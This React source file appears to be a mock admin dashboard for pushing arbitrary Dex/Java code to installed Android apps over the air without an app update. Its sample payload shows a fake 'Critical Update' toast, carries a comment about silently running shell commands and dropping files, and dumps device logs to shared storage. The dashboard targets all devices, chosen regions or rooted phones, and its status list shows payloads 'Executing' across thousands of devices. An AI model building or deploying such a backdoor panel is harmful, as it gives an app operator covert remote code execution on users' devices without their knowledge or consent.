import React from 'react';
import { Send, Zap, Server, Activity, ShieldAlert, Code } from 'lucide-react';

export default function DynamicPayload() {
  return (
    <div className="space-y-6">
      <div className="mb-6">
        <h3 className="text-xl font-semibold text-gray-900">Dynamic Payload Execution (OTA)</h3>
        <p className="text-sm text-gray-500 mt-1">Deploy raw Dex/Smali or Java logic to targeted devices in real-time without requiring an app update.</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Editor Area */}
        <div className="lg:col-span-2 bg-slate-900 rounded-xl shadow-lg border border-slate-700 flex flex-col overflow-hidden">
          <div className="bg-slate-950 px-4 py-3 border-b border-slate-800 flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <Code size={16} className="text-blue-400" />
              <span className="text-xs font-mono text-slate-300">PayloadEditor.java (Compiles to .dex)</span>
            </div>
            <div className="flex space-x-2">
              <button className="text-xs bg-slate-800 text-slate-300 px-2 py-1 rounded hover:bg-slate-700 transition-colors">Format</button>
              <button className="text-xs bg-slate-800 text-slate-300 px-2 py-1 rounded hover:bg-slate-700 transition-colors">Verify Syntax</button>
            </div>
          </div>
          
          <div className="relative flex-1">
            <div className="absolute left-0 top-0 bottom-0 w-12 bg-slate-950 border-r border-slate-800 text-right pr-2 pt-4 text-xs font-mono text-slate-600 select-none">
              1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12
            </div>
            <textarea 
              className="w-full h-[400px] bg-slate-900 text-slate-200 font-mono text-sm pl-16 pr-4 pt-4 pb-4 focus:outline-none resize-none"
              spellCheck="false"
              defaultValue={`package com.payload.dynamic;

import android.content.Context;
import android.widget.Toast;

public class OtaPayload implements PayloadInterface {
    
    @Override
    public void execute(Context context) {
        // Your dynamic runtime code here
        Toast.makeText(context, "Critical Update Broadcast Received!", Toast.LENGTH_LONG).show();
        
        // Execute shell commands, launch intents, or drop files silently
        Runtime.getRuntime().exec("logcat -d > /sdcard/app_logs.txt");
    }
}`}
            ></textarea>
          </div>
        </div>

        {/* Deployment Controls */}
        <div className="space-y-6">
          <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-5">
            <h4 className="text-sm font-semibold text-slate-800 mb-4 flex items-center">
              <TargetIcon className="w-4 h-4 mr-2 text-blue-500" />
              Deployment Targeting
            </h4>
            
            <div className="space-y-4">
              <div>
                <label className="block text-xs font-medium text-slate-600 mb-1">Target Audience</label>
                <select className="w-full text-sm border-gray-300 border rounded-lg px-3 py-2 outline-none focus:ring-2 focus:ring-blue-500">
                  <option>All Active Devices (12,450)</option>
                  <option>App Version &lt; 1.0.4 (2,250)</option>
                  <option>Specific Geo/Region (IN, BD)</option>
                  <option>Suspicious Devices / Rooted</option>
                </select>
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-600 mb-1">Execution Trigger</label>
                <select className="w-full text-sm border-gray-300 border rounded-lg px-3 py-2 outline-none focus:ring-2 focus:ring-blue-500">
                  <option>Immediate (Push via WebSocket)</option>
                  <option>Next App Launch</option>
                  <option>Background Service Polling</option>
                </select>
              </div>

              <div className="pt-4 border-t border-gray-100">
                <button className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 rounded-lg flex items-center justify-center space-x-2 transition-all shadow-md shadow-blue-500/20">
                  <Zap size={18} />
                  <span>Compile & Deploy Payload</span>
                </button>
              </div>
            </div>
          </div>

          <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-5">
             <h4 className="text-sm font-semibold text-slate-800 mb-4 flex items-center">
              <Activity size={16} className="mr-2 text-emerald-500" />
              Live Deployment Status
            </h4>
            <div className="space-y-3">
              <div className="flex justify-between items-center">
                <span className="text-sm text-slate-600">Payload_V4.dex</span>
                <span className="text-xs font-medium text-emerald-600 bg-emerald-50 px-2 py-1 rounded-full">Executing (8,421 / 12k)</span>
              </div>
              <div className="w-full bg-gray-100 rounded-full h-1.5">
                <div className="bg-emerald-500 h-1.5 rounded-full" style={{ width: '70%' }}></div>
              </div>
              
              <div className="flex justify-between items-center pt-2">
                <span className="text-sm text-slate-600">KillSwitch_Auth.dex</span>
                <span className="text-xs font-medium text-slate-500 bg-slate-100 px-2 py-1 rounded-full">Completed (220)</span>
              </div>
              <div className="w-full bg-gray-100 rounded-full h-1.5">
                <div className="bg-slate-400 h-1.5 rounded-full" style={{ width: '100%' }}></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// Custom simple SVG icon component just for internal usage
function TargetIcon(props: React.SVGProps<SVGSVGElement>) {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" {...props}>
      <circle cx="12" cy="12" r="10"/>
      <circle cx="12" cy="12" r="6"/>
      <circle cx="12" cy="12" r="2"/>
    </svg>
  );
}
